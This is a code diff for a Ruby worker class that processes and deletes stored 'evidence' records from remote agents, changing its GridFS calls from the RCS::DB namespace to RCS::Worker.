@@ -63,7 +63,7 @@ class InstanceWorker
       get_agent_target
     rescue InvalidAgentTarget => e
       trace :error, "Cannot find agent #{ident}:#{instance}, deleting all related evidence."
-      RCS::DB::GridFS.delete_by_filename("#{ident}:#{instance}", "evidence")
+      RCS::Worker::GridFS.delete_by_filename("#{ident}:#{instance}", "evidence")
       return
     end
 
@@ -88,7 +88,7 @@ class InstanceWorker
             start_time = Time.now
 
             # get binary evidence
-            data = RCS::DB::GridFS.get(raw_id, "evidence")
+            data = RCS::Worker::GridFS.get(raw_id, "evidence")
             next if data.nil?
 
             raw = data.read
@@ -101,11 +101,11 @@ class InstanceWorker
               end
             rescue EmptyEvidenceError => e
               trace :debug, "[#{raw_id}:#{@ident}:#{@instance}] deleting empty evidence #{raw_id}"
-              RCS::DB::GridFS.delete(raw_id, "evidence")
+              RCS::Worker::GridFS.delete(raw_id, "evidence")
               next
             rescue EvidenceDeserializeError => e
               trace :warn, "[#{raw_id}:#{@ident}:#{@instance}] decoding failed for #{raw_id}: #{e.to_s}, deleting..."
-              RCS::DB::GridFS.delete(raw_id, "evidence")
+              RCS::Worker::GridFS.delete(raw_id, "evidence")
 
               Dir.mkdir "decoding_failed" unless File.exists? "decoding_failed"
               path = "decoding_failed/#{raw_id}.dec"
@@ -172,7 +172,7 @@ class InstanceWorker
 
               rescue InvalidAgentTarget => e
                 trace :error, "Cannot find agent #{ident}:#{instance}, deleting all related evidence."
-                RCS::DB::GridFS.delete_by_filename("#{ident}:#{instance}", "evidence")
+                RCS::Worker::GridFS.delete_by_filename("#{ident}:#{instance}", "evidence")
               rescue Exception => e
                 trace :error, "[#{raw_id}:#{@ident}:#{@instance}] cannot store evidence, #{e.message}"
                 trace :error, "[#{raw_id}:#{@ident}:#{@instance}] #{e.backtrace}"
@@ -197,7 +197,7 @@ class InstanceWorker
           end
 
           # delete raw evidence
-          RCS::DB::GridFS.delete(raw_id, "evidence")
+          RCS::Worker::GridFS.delete(raw_id, "evidence")
           trace :debug, "deleted raw evidence #{raw_id}"
 
         end
